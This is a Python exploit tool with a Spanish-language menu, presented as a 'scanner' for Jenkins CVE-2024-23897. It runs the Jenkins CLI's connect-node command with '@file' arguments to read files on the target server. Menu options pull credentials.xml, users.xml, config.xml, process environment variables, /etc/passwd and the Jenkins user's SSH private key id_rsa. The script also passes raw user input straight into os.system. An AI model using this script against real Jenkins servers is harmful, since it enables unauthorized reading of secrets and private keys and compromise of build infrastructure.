import os

# Función para descargar jenkins-cli.jar desde la URL ingresada
def descargar_jenkins_cli(url):
    try:
        os.system(f"wget {url}/jnlpJars/jenkins-cli.jar")
        print("jenkins-cli.jar descargado exitosamente. 🖏 🖏 ")
    except Exception as e:
        print(f"Error al descargar jenkins-cli.jar: {e}")

# Función para ejecutar un comando específico
def ejecutar_comando(url, comando):
    try:
        print(f"Ejecutando comando: {comando} 🖏 ")
        os.system(f"java -jar jenkins-cli.jar -s {url} {comando}")
    except Exception as e:
        print(f"Error al ejecutar comando: {e}")

# Función principal del menú
def menu(url):
    while True:
        print("\n ⚒️ ⚒️ ⚒️  Seleccione el comando a ejecutar: ⚒️ ⚒️ ⚒️ ")
        print("☣️ 1. Obtener información del servidor (versión)")
        print("☣️ 2. Obtener información del entorno")
        print("☣️ 3. Obtener configuración de Jenkins")
        print("☣️ 4. Obtener información de los usuarios")
        print("☣️ 5. Obtener información de credenciales")
        print("☣️ 6. Realizar lectura de /etc/passwd")
        print("☣️ 7. Realizar lectura de /etc/os-release")
        print("☣️ 8. Realizar lectura de id_rsa")
        print("☣️ 9. Salir")

        opcion = input("Opción: ")

        if opcion == "1":
            ejecutar_comando(url, "version")
        elif opcion == "2":
            ejecutar_comando(url, "connect-node '@/proc/self/environ'")
        elif opcion == "3":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/config.xml'")
        elif opcion == "4":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/users/users.xml'")
        elif opcion == "5":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/credentials.xml'")
        elif opcion == "6":
            ejecutar_comando(url, "connect-node '@/etc/passwd'")
        elif opcion == "7":
            ejecutar_comando(url, "connect-node '@/etc/os-release'")
        elif opcion == "8":
            ejecutar_comando(url, "connect-node '@/var/lib/jenkins/.ssh/id_rsa'")
        elif opcion == "9":
            break
        else:
            print("Opción inválida. Inténtalo de nuevo.")

# Función principal
def main():
    print("************************************")
    print("*                                  *")
    print("*        scanner CVE-2024-23897    *")
    print("*          Por: Pulentoski         *")
    print("*          🕵️‍  🔍 🧐 ☣️              *")
    print("*                                  *")
    print("************************************")

    url = input("Ingrese la URL de Jenkins: 🧐 ")
    
    # Preguntar si se desea descargar jenkins-cli.jar
    descargar = input("¿Desea descargar jenkins-cli.jar? (s/n): ")
    if descargar.lower() == "s":
        descargar_jenkins_cli(url)

    menu(url)

if __name__ == "__main__":
    main()
